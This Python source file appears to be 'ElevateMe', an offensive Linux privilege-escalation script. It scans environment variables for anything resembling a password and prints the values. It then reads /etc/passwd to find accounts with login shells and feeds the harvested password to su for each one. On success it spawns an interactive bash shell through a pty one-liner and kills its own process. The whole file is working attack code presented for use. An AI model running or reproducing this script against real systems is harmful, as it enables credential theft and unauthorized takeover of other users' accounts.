import platform
import os
import grp
import subprocess
import getpass
import time
import sys
import signal


class General_info:
    def __init__(self):
        art = """
        ElevateMe
                """
        print(art)
        self.pid = os.getpid()
    def check_os(self):
        check = platform.system()
        if check != 'Linux':
            print('[-] Your operating system is not supported')
        else:
            red =  '\033[31m'
            reset = '\033[m'
            blue = '\033[34m'
            yellow = '\033[33m'
            
            print(f'[+] Spawned PID {yellow} + {self.pid}, {reset}')
            osVersion = platform.version()
            print(f'[+] Detected OS {yellow} + {osVersion}, {reset}')
            runningUser = getpass.getuser()
            if runningUser == 'root':
                 print(f'[+] Running as user {red} + {runningUser}, {reset}')
            else:
                 print(f'[+] Running as user {blue} + {runningUser}, {reset}')
                 
            groupId = os.getgroups()
            print(f'[+] Groups associated with user')
            for id in groupId:
                groupInfo = grp.getgrgid(id)
                groupName = groupInfo.gr_name
                print(f'{blue} + {groupName}, {reset}')

class Switch_user:
    def __init__(self):
        self.red =  '\033[31m'
        self.reset = '\033[m'
        self.blue = '\033[34m'
        self.shells = {
            '/bin/bash',
            '/bin/zsh',
            '/bin/dash',
            '/bin/sh',
            '/bin/csh',
            '/bin/tcsh',
            '/bin/ksh',
            '/bin/fish',
            '/usr/bin/bash',
            '/usr/bin/zsh',
            '/usr/bin/dash',
            '/usr/bin/csh',
            '/usr/bin/tcsh',
            '/usr/bin/ksh',
            '/usr/bin/fish',
            '/usr/bin/zsh'}
        self.passwords = []
        self.pid = os.getpid()
        
        

    def check_env(self):
        environmentVariables = os.environ
        passwordVariables = []
        for key, value in environmentVariables.items():
                    if any(keyword in key.lower() or keyword in value.lower() for keyword in ['pass', 'password', 'psswrd']):
                        passwordVariables.append((key, value))

        if passwordVariables:
            print("[+] Passwords found!")
            for key, value in passwordVariables:
                self.passwords.append(value)
                print(f"{self.red} + {key}: {self.red} +{value}, {self.reset}")
        else:
             print("No obvious passwords in env")             

    def check_users(self):
        users = set()
        with open('/etc/passwd', 'r') as passwdFile:
             for line in passwdFile:
                  parts = line.split(':')
                  username, shell = parts[0], parts[-1].strip()
                  if any(shell in s for s in self.shells):
                       users.add(username)       
        if users:
                 print(f'[+] Switching user')
                 for user in users:  
                    print(f'{self.blue} {user} {self.reset}')
                    self.switch_user(user)
                    
    def switch_user(self, user):
        if len(self.passwords) == 0:
            print('No passwords found')
        else:
            password = self.passwords[0]
            try:
             proc = subprocess.run(['/usr/bin/su', user], input=(password + '\n').encode(), check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
             if proc.returncode == 0:  
                cmd = f"echo {password} | /usr/bin/su - {user} -c 'python3 -i -c \"import pty; pty.spawn(\\\"/bin/bash\\\")\"; kill {self.pid}'"
                subprocess.run(cmd, shell=True, check=True)
                
                print('it worked')
            except subprocess.CalledProcessError as e:
                 time.sleep(0.2)
                 print(f"Failed to switch to user {user}: {e}")



if __name__ == "__main__":
     obj1 = General_info()
     obj1.check_os()
     obj2 = Switch_user()
     obj2.check_env()
     obj2.check_users()
     

     





